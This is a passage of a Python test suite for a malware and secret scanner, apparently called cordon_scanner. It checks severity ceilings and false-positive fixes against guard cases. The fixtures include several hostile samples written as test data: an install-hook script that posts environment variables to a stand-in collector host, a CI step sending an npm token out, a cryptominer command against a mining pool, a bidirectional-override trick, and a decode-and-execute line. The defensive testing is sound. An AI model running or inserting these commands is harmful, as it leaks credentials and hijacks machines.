    cannot delete the keys, and has nothing to do but suppress the rule.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "t/unit/security/__init__.py",
            "t/integration/test_canvas.py",
            "pkg/mocks/client.go",
            "src/__mocks__/api.ts",
            "internal/golden/output.json",
            "spec/fixtures/key.pem",
            "e2e/support/commands.js",
            "samples/quickstart/config.yaml",
        ],
    )
    def test_it_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)

    @pytest.mark.parametrize(
        "path",
        ["celery/app/base.py", "src/main.rs", "cmd/server/main.go", "lib/client.rb"],
    )
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert not is_test_material(path)


class TestACredentialInDocumentationIsUsuallyAFormat:
    """Celery's SQS page carries a broker URL whose access key is the alphabet in
    order, and two lines below it the same URL written with
    `aws_access_key_id:aws_secret_access_key` as the format. The first was reported
    at HIGH.

    Ceilinged rather than suppressed, and the distinction matters: a real key pasted
    into a README leaks exactly as far as one in a settings file, and plenty have
    been. It stays in the report, below the severity that fails a build, with a
    caveat saying why.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "docs/getting-started/brokers/sqs.rst",
            "README.md",
            "CONTRIBUTING.md",
            "doc/configuration.txt",
            "notebooks/demo.ipynb",
            "config/app.yaml.example",
        ],
    )
    def test_it_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert is_documentation(path)

    @pytest.mark.parametrize("path", ["src/settings.py", "app/config.ts", "main.go"])
    def test_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert not is_documentation(path)

    def test_a_key_in_a_readme_is_reported_below_blocking(self, tmp_path) -> None:
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / "README.md").write_text(
            f"Set your key:\n\n    SECRET_KEY={value}\n", encoding="utf-8"
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        hits = [f for f in result.findings if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"]
        assert hits, "a credential in documentation must still be reported"
        assert all(f.severity <= Severity.MEDIUM for f in hits)
        assert all("documentation" in f.message for f in hits)


class TestADoctestIsDocumentation:
    """Django's template parser documents itself with a doctest line assigning a
    filter expression to a local called `token`, and the assignment rule read the
    filter expression as a credential assigned to it. A transcript is prose that
    happens to be executable, and a value in one illustrates a format by
    construction.
    """

    @pytest.mark.parametrize(
        "line",
        [
            ">>> token = 'variable{0}default:\"Default value\"'",
            "... token = 'variable{0}default:\"Default value\"'",
            "$ export AUTH_TOKEN=" + assemble("aB3kQ9mZ", "2xT7vL4nR8wY"),
            "In [3]: token = 'variable{0}default:\"Default value\"'",
        ],
    )
    def test_a_transcript_line_is_an_example(self, tmp_path, line: str) -> None:
        (tmp_path / "base.py").write_text(
            f'"""\nSample::\n\n    {line.format("|")}\n"""\n', encoding="utf-8"
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_an_ordinary_assignment_still_fires(self, tmp_path) -> None:
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / "settings.py").write_text(f'SECRET_KEY = "{value}"\n', encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)


class TestAWindowsEnvironmentReferenceIsNotAValue:
    """Django's documentation extension builds `token = "%HOMEPATH%\\\\" + token[2:]`,
    which the assembled-literal path folded into a value assigned to something
    called `token` and reported at HIGH.

    `%VAR%` says the value arrives from the environment exactly as plainly as `$VAR`
    does, and the POSIX form was already here. Any build script that touches Windows
    paths is full of it.
    """

    @pytest.mark.parametrize(
        "value", [rb"%HOMEPATH%\\", rb"%USERPROFILE%/.config", rb"%APPDATA%\\cordon"]
    )
    def test_it_is_a_placeholder(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(value)

    def test_a_real_value_is_not(self) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert not PLACEHOLDER.search(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode())


class TestAnUnderscoredNameIsStillAName:
    """`INTERNAL_RESET_SESSION_TOKEN = "_password_reset_token"` at HIGH. The value is
    a session key NAME, and the identifier alternative in `NOT_A_SECRET` required the
    first character to be a letter -- so a leading underscore, which is how Python
    spells "private", made an obvious identifier unrecognisable.
    """

    @pytest.mark.parametrize(
        "value", [b"_password_reset_token", b"_auth_token_cache", b"_internal_secret_key"]
    )
    def test_it_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value)

    def test_key_material_is_still_key_material(self) -> None:
        assert NOT_A_SECRET.match(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode()) is None


class TestAGpgFingerprintIsNotAWalletAddress:
    """`vuejs/core` reported at HIGH for "Cryptocurrency mining", on a file that is
    six lines of JSON declaring where to send sponsorship money.

    `0x` followed by forty hex characters is an Ethereum address. It is also exactly
    how every apt and yum repository writes a signing key, so Ansible's `apt_key`
    documentation and its apt integration tests were reported the same way -- and so
    would every repository that configures a third-party apt source.

    The composite above promotes any single `mine` capability to HIGH, so one
    forty-character hex string was the whole of the evidence for a mining accusation.
    The composite's own message says it "references a mining pool protocol, a pool
    host or a miner binary" and does not mention a wallet at all, which is the same
    shape of defect as the `pull_request_target` rule: a message claiming more than
    the match requires.
    """

    @staticmethod
    def wallet_pattern():
        from cordon_scanner.rules.loader import RuleLoader

        for pack in RuleLoader.load_builtin():
            for rule in pack.rules:
                if rule.id == "CAP.MINE.WALLET.001":
                    return rule.match.regex
        raise AssertionError("CAP.MINE.WALLET.001 is not in the built-in packs")

    #: A forty-character hex fingerprint, assembled at call time. This file is
    #: scanned by the tool it tests and the tool gets no exception for its own suite.
    @staticmethod
    def fingerprint() -> str:
        return assemble("0x", "D06AAF4C11DAB86DF42", "1421EFE6B20ECA7AD98A1")

    @staticmethod
    def address() -> str:
        """A Monero address, not an Ethereum one.

        The Ethereum alternative was removed from `CAP.MINE.WALLET.001` after three
        rounds of negative lookbehinds failed to separate it from a GPG fingerprint:
        `0x` plus forty hex characters is the same string either way, and Ansible's
        `apt_key` documentation still produced a cryptominer finding from
        `id: 0x9FED2BCB...`. Monero is the currency cryptojacking actually uses and its
        ninety-five characters are a shape nothing else produces.
        """
        alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        return assemble("4A", (alphabet * 3)[:93])

    @pytest.mark.parametrize(
        "template",
        [
            "url: https://keyserver.ubuntu.com/pks/lookup?op=get&search={0}",
            "# http://keyserver.ubuntu.com:11371/pks/lookup?search={0}&op=index",
            "gpg --recv-keys {0}",
            "apt-key adv --keyid {0}",
            # The label nobody can enumerate in advance, which is what ended the
            # lookbehind approach: Ansible's apt_key documentation writes it this way.
            "    id: {0}",
            "ownedBy: '{0}'",
        ],
    )
    def test_a_signing_key_is_not_a_payout_address(self, template: str) -> None:
        assert self.wallet_pattern().search(template.format(self.fingerprint()).encode()) is None

    @pytest.mark.parametrize("template", ["WALLET = '{0}'", "payout_address={0}"])
    def test_a_payout_address_still_matches(self, template: str) -> None:
        assert self.wallet_pattern().search(template.format(self.address()).encode()) is not None

    def test_a_sponsorship_manifest_is_not_mining(self, tmp_path) -> None:
        """GitHub reads this exact filename, and an address in it was published on
        purpose as somewhere to send money."""
        owner = assemble("0x", "5393BdeA2a020769256d", "9f337B0fc81a2F64850A")
        (tmp_path / "FUNDING.json").write_text(
            '{\n  "drips": {\n    "ethereum": {\n'
            f'      "ownedBy": "{owner}"\n'
            "    }\n  }\n}\n",
            encoding="utf-8",
        )
        assert "SUSPECT.CRYPTOMINER.001" not in flagged(tmp_path)

    def test_a_real_miner_still_fires(self, tmp_path) -> None:
        """The guard. Stratum exists for mining and nothing else, which is the
        evidence the composite's message actually describes."""
        # Split across every indicator: the miner binary name, the protocol scheme
        # and the pool host each match on their own.
        miner = assemble("xm", "rig")
        pool = assemble("stratum", "+tcp://", "pool.", "minexmr", ".com:4444")
        (tmp_path / "run.sh").write_text(
            f"#!/bin/sh\n./{miner} -o {pool} -u {self.address()}\n", encoding="utf-8"
        )
        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)


class TestAnExampleOfAnAttackIsNotAnAttack:
    """The composites and the obfuscation rules had no severity ceiling for test
    material, which the secrets detector has always had.

    `bandit/examples/marshal_deserialize.py` is the clearest case: a file whose
    entire purpose is to be an example of unsafe deserialisation, in a security
    tool's `examples/` directory, reported at HIGH as decode-and-execute. The finding
    is not wrong about what the file does. It is wrong about what a reader should do
    next.

    Bandit's `plugins/trojansource.py` is the same thing one step further in: the
    plugin that DETECTS Trojan Source attacks has to contain the characters it
    detects, and it was reported for containing them. Every scanner in this category
    hits that on its own corpus, and on every repository that vendors security rules.

    A ceiling, not a suppression, and the ordering matters in both places: the
    install-hook escalation is applied after, so a payload under `tests/` that runs
    at install time still reaches CRITICAL. MALICIOUS findings are never ceilinged --
    a dropper in a fixture directory is still a dropper.
    """

    def test_an_example_of_unsafe_deserialisation_is_not_blocking(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        examples = tmp_path / "examples"
        examples.mkdir()
        (examples / "marshal_deserialize.py").write_text(
            "import marshal, base64\n\nmarshal.loads(base64.b64decode(DATA))\n",
            encoding="utf-8",
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        decode = [f for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
        assert decode, "the pattern is still reported"
        assert all(f.severity <= Severity.MEDIUM for f in decode)

    def test_the_same_file_in_application_code_still_blocks(self, tmp_path) -> None:
        """The guard that makes the test above mean something."""
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "loader.py").write_text(
            "import marshal, base64\n\nmarshal.loads(base64.b64decode(DATA))\n",
            encoding="utf-8",
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        decode = [f for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
        assert decode and any(f.severity >= Severity.HIGH for f in decode)

    def test_a_trojan_source_fixture_is_not_a_trojan(self, tmp_path) -> None:
        """Bandit ships `examples/trojansource.py`, the sample its Trojan Source
        plugin was written against, and it was reported at HIGH for containing the
        characters it exists to demonstrate.

        Its `plugins/trojansource.py` -- the detector itself -- is NOT covered by
        this and still reports at HIGH. That is honest rather than ideal: the file is
        ordinary application code by every signal available, and the only thing
        separating it from a file carrying an override is intent. The CAP.MINE rules
        solve the same problem with a narrow exclusion for rule-definition file
        paths; there is no equivalent convention for a detector written in Python,
        and inventing one that matched `**/plugins/**` would exempt a directory
        every framework on earth has.
        """
        from cordon_scanner.core.models import Severity

        examples = tmp_path / "examples"
        examples.mkdir()
        (examples / "trojansource.py").write_text(
            f"BIDI = [\n    '{chr(0x202E)}',  # right-to-left override\n]\n", encoding="utf-8"
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        # Reported, because the characters really are there, and not at a severity
        # that fails a build, because the file's job is to hold them.
        assert bidi
        assert all(f.severity <= Severity.MEDIUM for f in bidi)

    def test_an_override_in_application_code_still_blocks(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "auth.py").write_text(
            f"if user {chr(0x202E)}== 'admin':\n    grant()\n", encoding="utf-8"
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        assert bidi and any(f.severity >= Severity.HIGH for f in bidi)


class TestTokenMeansTwoThings:
    """Measured across 338 of the most-starred repositories on GitHub,
    `SECRET.GENERIC.ASSIGNMENT.001` fired at blocking severity in 42% of them. No
    plausible world has four in ten of the best-read codebases on the internet
    leaking credentials.

    The largest single cause was one English word with two unrelated meanings. The
    credential keyword was allowed to run into anything that followed it, which made
    it a PREFIX test: `tokenizer` was reported as a credential, and so were
    `maxTokens`, `promptTokens`, `completionTokens` and `max_new_tokens` -- counts in
    every codebase that talks to a language model -- and `tokens`, which is usually a
    lexer's output.

    The keyword now has to be a whole word: a suffix is accepted only when it starts
    the way a new word starts, with a separator or a capital.
    """

    VALUE = ("aB3kQ9mZ", "2xT7vL4nR8wY")

    def fires(self, name: str) -> bool:
        return ASSIGNMENT.search(f'{name} = "{assemble(*self.VALUE)}"'.encode()) is not None

    @pytest.mark.parametrize(
        "name",
        [
            "tokenizer",
            "maxTokens",
            "promptTokens",
            "completionTokens",
            "max_new_tokens",
            "tokens",
            "JoinTokens",
            "secretsmanager",
        ],
    )
    def test_a_different_word_is_not_a_credential(self, name: str) -> None:
        assert not self.fires(name)

    @pytest.mark.parametrize(
        "name",
        [
            "GITHUB_TOKEN",
            "api_key",
            "privateKey",
            "accessToken",
            "SECRET_KEY_BASE",
            "access_token_value",
            "accessTokenValue",
            "password",
            "client_secret",
            "AUTH_TOKEN",
        ],
    )
    def test_a_credential_name_still_fires(self, name: str) -> None:
        assert self.fires(name)

    def test_passphrase_was_added_while_narrowing(self) -> None:
        """`pass` followed by lowercase letters is now refused, which would have lost
        `passphrase` -- a real credential name -- so it is named in the keyword list
        rather than left to the prefix behaviour that used to cover it."""
        assert self.fires("passphrase")


class TestANameSaysWhatItHolds:
    """Three more shapes behind the same rule, all of them names that describe a
    credential rather than being one.

    `AntiforgeryTokenFieldName` in ASP.NET Core, `awsContainerAuthorizationTokenEnv`
    in the AWS SDK and `SpiffeJwtNormalizedTokenUnits` in Vault were all reported.
    Every one ends in a word already on the configuration list, and every one spells
    its compound in CamelCase, which the split could not see.

    `vaultPathTokenCreate` and eight siblings hold API routes like
    "auth/token/create". Those end in `create`, and the word that matters is in the
    middle -- so location words are checked anywhere in the name, which a suffix test
    cannot do.
    """

    @pytest.mark.parametrize(
        "name",
        [
            "AntiforgeryTokenFieldName",
            "awsContainerAuthorizationTokenEnv",
            "SpiffeJwtNormalizedTokenUnits",
            "credentialType",
            "CredentialScope",
            "SecretEngineCounts",
            "Auth_VerifyTokenAuthority_FullMethodName",
        ],
    )
    def test_camel_case_is_split(self, name: str) -> None:
        assert names_configuration(name)

    @pytest.mark.parametrize(
        "name",
        [
            "vaultPathTokenCreate",
            "vaultPathTokenRevokeSelf",
            "vaultPathTokenLookup",
            "TOKEN_URL_OVERRIDE",
            "secret_endpoint_template",
        ],
    )
    def test_a_location_word_anywhere_is_enough(self, name: str) -> None:
        assert names_configuration(name)

    @pytest.mark.parametrize(
        "name", ["SECRET_KEY", "api_key", "DEMO_PASSWORD", "privateKey", "TOTPSecret"]
    )
    def test_a_credential_name_is_untouched(self, name: str) -> None:
        assert not names_configuration(name)


class TestWhereTheRestOfTheWorldKeepsItsFixtures:
    """Vault had twenty-one private keys reported at CRITICAL under
    `api/test-fixtures/keys/`, `command/agent/test-fixtures/reload/` and six more
    directories -- every one a certificate generated for a TLS reload test.

    `fixtures/` was on the list. `test-fixtures/`, with the hyphen, was not.

    The same run turned up `ui/mirage/factories/` (Mirage exists to produce
    plausible-looking data, so a generated password is the point of the file) and
    `integtest/`, which is an integration-test directory that does not spell it
    "integration".
    """

    @pytest.mark.parametrize(
        "path",
        [
            "api/test-fixtures/keys/key.pem",
            "command/agent/test-fixtures/reload/reload_bar.key",
            "internal/testdata/cert.pem",
            "command/agent/testing.go",
            "pkg/testutil/helpers.go",
            "ui/mirage/factories/ldap-credential.js",
            "spec/factories/users.rb",
            "command/auth/kerberos/integtest/integrationtest.sh",
            "tls/testcerts/server.key",
        ],
    )
    def test_it_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)

    @pytest.mark.parametrize(
        "path", ["vault/login_mfa.go", "src/auth/session.ts", "lib/credentials.rb"]
    )
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert not is_test_material(path)


class TestPublishingIsNotExfiltration:
    """`SUSPECT.EXFIL.001`, `SUSPECT.DROPPER.001` and `SUSPECT.ANTI_ANALYSIS.001` each
    fired in a fifth to a third of all repositories measured, and for all three
    roughly HALF the findings were in the project's own build and release tooling:
    `scripts/dist.sh`, `packaging/utils/coverity-scan.sh`,
    `.buildkite/scripts/dra-workflow.trigger.sh`, `setup.py`.

    Each of those reads a token from the environment, calls an API and runs a
    command. That is credential plus egress plus spawn, which is the composite. It is
    also what publishing a release IS. The composite's own source already named this
    shape as the problem -- "a deploy script that pushes and posts to Slack" is in the
    comment explaining why a third signal was added -- and it was still firing on
    exactly that.

    A ceiling, with three things keeping it from being a hole: MALICIOUS is never
    ceilinged, the install-hook escalation is applied afterwards so anything running
    unprompted still reaches CRITICAL, and a script here runs when somebody runs it,
    which is not the threat the composites are calibrated for.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "scripts/dist.sh",
            "packaging/utils/coverity-scan.sh",
            ".buildkite/scripts/dra-workflow.trigger.sh",
            ".github/actions/pr_diff/script.sh",
            "setup.py",
            "Makefile",
            "dev/breeze/src/airflow_breeze/utils/run_utils.py",
            "hack/verify-gofmt.sh",
            "tools/release/publish.js",
        ],
    )
    def test_build_tooling_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert is_build_tooling(path)

    @pytest.mark.parametrize(
        "path",
        [
            "web/public/pdf.worker.min.mjs",
            ".yarn/releases/yarn-4.17.1.cjs",
            ".github/actions/needs-triage/dist/index.js",
            "session/auth/auth_grpc.pb.go",
            "proto/service_pb2.py",
        ],
    )
    def test_generated_output_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_generated_artefact

        assert is_generated_artefact(path)

    @pytest.mark.parametrize(
        "path",
        [
            # Somebody else's SOURCE, deliberately not ceilinged: that is exactly
            # where a supply-chain payload lives, and blunting the rules there would
            # blunt them where they matter most.
            "vendor/github.com/moby/buildkit/session/auth.go",
            "node_modules/left-pad/index.js",
            "src/app/main.py",
        ],
    )
    def test_vendored_source_and_application_code_are_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling, is_generated_artefact

        assert not is_build_tooling(path)
        assert not is_generated_artefact(path)

    def test_a_release_script_is_reported_below_blocking(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "dist.sh").write_text(
            "#!/bin/sh\n"
            'TOKEN="$GITHUB_TOKEN"\n'
            'curl -H "Authorization: $TOKEN" -d @dist.tgz https://uploads.example.test/r\n'
            "tar czf dist.tgz ./build\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        exfil = [f for f in result.findings if f.rule_id.startswith("SUSPECT.EXFIL")]
        assert all(f.severity <= Severity.MEDIUM for f in exfil)

    def test_the_same_script_run_at_install_time_still_blocks(self, tmp_path) -> None:
        """The ordering that keeps the ceiling safe: the install-hook escalation is
        applied after it, so code that runs unprompted is unaffected."""
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "dist.sh").write_text(
            '#!/bin/sh\ncurl -d "$(env)" https://collector.example.invalid/r\nsh ./payload\n',
            encoding="utf-8",
        )
        (tmp_path / "package.json").write_text(
            '{"name":"x","version":"1.0.0","scripts":{"postinstall":"sh scripts/dist.sh"}}\n',
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        hits = [f for f in result.findings if f.location.path.endswith("scripts/dist.sh")]
        assert any(f.severity >= Severity.HIGH for f in hits), [
            (f.rule_id, str(f.severity)) for f in hits
        ]


class TestALocalCrateHasNothingToHashAgainst:
    """`POLICY.LOCKFILE.INTEGRITY.001` fired in 231 of 535 repositories measured --
    43%, the highest-spread rule in the tool -- on a fact of Cargo's file format.

    `Cargo.lock` omits the `source` line for every workspace member, because the
    crate is in this repository. `is_registry_host(None)` returns True for every
    ecosystem: an absent URL is not evidence of anything, and treating it as evidence
    of the registry turned ripgrep's ten `grep-*` crates, its own entry, `globset`
    and `ignore` into registry packages whose hashes had gone missing. About 17% of
    the entries, which is under the 90% "this format carries no hashes" threshold, so
    it reported at HIGH.

    The fix is on the parser, not on `is_registry_host`: only the parser knows what
    an absent field means in its own format. `LockEntry.local` and `Dependency.local`
    carry that answer to the two rules that need it.
    """

    CARGO_LOCK = """version = 4

[[package]]
name = "ripgrep"
version = "14.1.1"
dependencies = [
 "grep",
 "anyhow",
]

[[package]]
name = "grep"
version = "0.3.2"

[[package]]
name = "anyhow"
version = "1.0.104"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "330a5ed07fa54e4702c9d6c4174f74427fc0ef6e214bbd677ae50a5099946470"
"""

    def test_a_workspace_member_is_marked_local(self) -> None:
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.ecosystems.registry import EcosystemRegistry

        raw = self.CARGO_LOCK.encode()
        content = FileContent(path="Cargo.lock", raw=raw, size=len(raw))
        graph = EcosystemRegistry.get("cargo").parse_lockfile(content)
        by_name = {e.name: e for e in graph.entries}
        assert by_name["ripgrep"].local, "the workspace root has no source line"
        assert by_name["grep"].local, "a path member has no source line"
        assert not by_name["anyhow"].local, "a registry crate does"

    @staticmethod
    def rule_ids(root) -> set[str]:
        """Every rule id, across every category.

        Not `flagged`, which keeps only MALICIOUS and SUSPICIOUS findings -- and both
        of these rules are POLICY. The first version of these tests used `flagged`, and
        the "is not reported" half passed for the wrong reason: the id could never have
        appeared in that set whether the fix worked or not.
        """
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return {f.rule_id for f in result.findings}

    def test_a_rust_workspace_is_not_reported(self, tmp_path) -> None:
        (tmp_path / "Cargo.lock").write_text(self.CARGO_LOCK, encoding="utf-8")
        (tmp_path / "Cargo.toml").write_text(
            '[package]\nname = "ripgrep"\nversion = "14.1.1"\n', encoding="utf-8"
        )
        found = self.rule_ids(tmp_path)
        assert "POLICY.LOCKFILE.INTEGRITY.001" not in found, found
        assert "POLICY.DEPENDENCY.INTEGRITY.001" not in found, found

    def test_a_registry_crate_with_no_checksum_still_is(self, tmp_path) -> None:
        """The guard. A real registry entry that lost its hash is the anomaly this
        rule exists for, and it must survive the fix."""
        (tmp_path / "Cargo.lock").write_text(
            self.CARGO_LOCK + '\n[[package]]\nname = "serde"\nversion = "1.0.2"\n'
            'source = "registry+https://github.com/rust-lang/crates.io-index"\n',
            encoding="utf-8",
        )
        found = self.rule_ids(tmp_path)
        assert "POLICY.LOCKFILE.INTEGRITY.001" in found, found


class TestATestSuiteForAnImageLibraryIsMadeOfBrokenImages:
    """`SUSPECT.POLYGLOT.MISMATCH.001` produced 1,022 findings across 100 of 535
    repositories. The binary detector was the last one with no severity ceiling for
    test material, and a format-mismatch rule needs one more than most.

    FFmpeg's `tests/ref/lavf/apng.png` and its siblings are reference outputs for
    format tests. Ladybird ships `Tests/LibWeb/.../images/broken.png`, which is
    broken on purpose and says so in its name. Django's `tests/files/brokenimg.png`
    contains four bytes.
    """

    def test_a_deliberately_broken_fixture_is_not_blocking(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        tests = tmp_path / "tests" / "files"
        tests.mkdir(parents=True)
        (tests / "brokenimg.png").write_bytes(b"123\n")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        mismatch = [f for f in result.findings if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"]
        assert mismatch, "the mismatch is still reported"
        assert all(f.severity <= Severity.MEDIUM for f in mismatch)

    def test_the_same_file_in_application_code_still_blocks(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        assets = tmp_path / "static" / "img"
        assets.mkdir(parents=True)
        (assets / "logo.png").write_bytes(b"#!/bin/sh\necho hello\n")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        mismatch = [f for f in result.findings if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"]
        assert mismatch and any(f.severity >= Severity.HIGH for f in mismatch)


class TestAnEphemeralJobTokenIsNotASecretToLeak:
    """`SUSPECT.CI.SECRET_EGRESS.001` fired in 31% of 535 repositories, and every
    sampled finding was an ordinary workflow: `release-milestone.yml`,
    `upload-test-stats.yml`, `notify-on-merge.yml`, `label_stale_issues.yml`,
    `send_release_notification.yml`.

    `secrets.GITHUB_TOKEN` is not a secret the repository holds. GitHub mints it per
    job, scopes it to that repository, and revokes it when the job ends -- there is
    nothing to rotate and nothing that outlives the job. Using it with `curl` or `gh`
    against the GitHub API is the most common thing in all of CI.

    The rule's own notes record that it was split out of the critical rule because it
    fired on "every pipeline publishing something with its own credential". It was
    still doing exactly that, one severity down.
    """

    @staticmethod
    def fires(workflow: str) -> bool:
        from cordon_scanner.detect.config_files import RULES, ConfigDetector

        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CI.SECRET_EGRESS.001")
        raw = workflow.encode()
        return rule.pattern.search(ConfigDetector._without_comments(raw)) is not None

    def test_the_job_token_against_the_github_api_is_ordinary(self) -> None:
        assert not self.fires(
            "jobs:\n  notify:\n    steps:\n"
            '      - run: curl -H "Authorization: ${{ secrets.GITHUB_TOKEN }}"'
            " https://api.github.com/repos/x/y/issues\n"
        )

    def test_a_named_user_secret_still_fires(self) -> None:
        """The guard: a secret the project owns, going somewhere this cannot check, is
        the observation the rule exists to make."""
        assert self.fires(
            "jobs:\n  leak:\n    steps:\n"
            '      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://collector.invalid/i\n'
        )

    def test_it_reports_below_blocking(self) -> None:
        """What separates publishing from exfiltration is where the data goes, and the
        rule's own message says it cannot decide that. A finding worth a reviewer's eye
        is not a finding worth failing a build, and this shape is far too common to
        block on -- the critical rule for a serialised secret context is untouched."""
        from cordon_scanner.core.models import Severity
        from cordon_scanner.detect.config_files import RULES

        egress = next(r for r in RULES if r.rule_id == "SUSPECT.CI.SECRET_EGRESS.001")
        exfil = next(r for r in RULES if r.rule_id == "MALWARE.CI.SECRET_EXFIL.001")
        assert egress.severity <= Severity.MEDIUM
        assert exfil.severity >= Severity.CRITICAL


class TestATrojanSourceAttackNeedsAReader:
    """`SUSPECT.OBFUSCATION.BIDI.001` produced 285 findings across 535 repositories,
    and the files were DuckDB's `.parquet` test data, Bevy's `.glb` models, Wails's
    compiled `Assets.car`, an After Effects `.aep`, an `.m4v`, a PhotoPrism `.xmp`
    sidecar, and TensorFlow's `icu_conversion_data.c.gz.afu` -- a character-encoding
    conversion table, which is a file whose entire purpose is to contain every
    codepoint there is.

    Trojan Source works because a REVIEWER reads one thing and a COMPILER acts on
    another. A file nobody reviews as text cannot be attacked that way, so a
    directional codepoint in one is a byte sequence rather than a deception.

    `language is None` is the gate `_long_lines` already applied, on reasoning written
    there years before this: a file with no identified language is data.
    """

    def test_a_data_file_is_not_an_attack(self, tmp_path) -> None:
        (tmp_path / "fixture.parquet").write_bytes(
            b"PAR1" + f"label{chr(0x202E)}value".encode() + b"\x00" * 64 + b"PAR1"
        )
        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)

    def test_an_encoding_table_is_not_an_attack(self, tmp_path) -> None:
        (tmp_path / "icu_conversion_data.c.gz.afu").write_bytes(
            "".join(chr(c) for c in (0x202A, 0x202B, 0x202C, 0x202D, 0x202E)).encode()
        )
        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)

    def test_source_is_still_checked(self, tmp_path) -> None:
        """The guard. A directional override in code a human reviews is the attack,
        and narrowing to source must not be narrowing to nothing."""
        (tmp_path / "auth.py").write_text(
            f"if user {chr(0x202E)}== 'admin':\n    grant()\n", encoding="utf-8"
        )
        assert "SUSPECT.OBFUSCATION.BIDI.001" in flagged(tmp_path)


class TestDoingItCorrectlyIsNotTheSameAsDoingItCarelessly:
    """`SUSPECT.CONTAINER.FETCH_EXEC.001` reported at HIGH on two Dockerfiles that
    are not remotely equivalent.

    Elasticsearch pins a release URL and then runs
    `echo "${tini_sum}  /tmp/tini" | sha256sum -c -`. That is precisely the control
    the rule's own remediation asks for -- "verify a pinned digest before executing".

    Vault runs `curl -sL https://deb.nodesource.com/setup_20.x | bash -`, which
    verifies nothing at all.

    Reporting both at the same severity tells a project that doing it properly and
    doing it carelessly are equally bad, which is how a rule stops being read.

    Demoted by one step rather than suppressed: a verified fetch is still a fetch, the
    bytes are pinned but the build still reaches the network, and that is worth a line
    in the report.
    """

    VERIFIED = (
        "FROM rockylinux:9\n"
        "RUN set -e ; \\\n"
        '    tini_sum="5be6b4f9ba4bf5b9b59bda1a37d4ad2e6b30b6e0a0f9bbbbbbbbbbbbbbbbbbbb" ; \\\n'
        "    curl -f -L -o /tmp/tini https://github.test/tini/releases/download/v0.19.0/tini ; \\\n"
        '    echo "${tini_sum}  /tmp/tini" | sha256sum -c - ; \\\n'
